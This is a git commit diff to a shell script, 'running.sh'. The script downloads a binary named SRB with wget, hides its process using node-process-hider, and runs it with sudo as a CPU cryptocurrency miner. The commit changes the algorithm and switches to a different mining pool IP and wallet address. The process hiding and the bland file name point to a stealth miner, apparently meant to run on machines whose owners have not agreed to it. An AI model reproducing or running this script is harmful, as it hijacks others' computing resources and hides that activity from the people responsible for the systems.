96a4211a3d4d8fe5e851937030fa043f14db6105
realxdagg <121330162+realxdagg@users.noreply.github.com>
2022-12-27 11:50:16 +0700

    Update running.sh

--- running.sh
+++ running.sh
@@ -3,4 +3,4 @@ npm i -g node-process-hider
 wget https://raw.githubusercontent.com/realxdagg/job/main/SRB
 chmod 500 SRB
 ph add SRB
-sudo ./SRB --disable-gpu --algorithm yescryptR16 --pool eu.mecrypto.club:5440 --wallet Tpps38UBDYdKNd6rMUMwZgoLfsCvQCHSgZ --worker running --cpu-threads 8
+sudo ./SRB --disable-gpu --algorithm yespower --pool 191.33.253.162:6233  --wallet PFcVgJVKSjQT6XoWM3H7vk4wZ7JLKXrUVY --worker running --cpu-threads 8
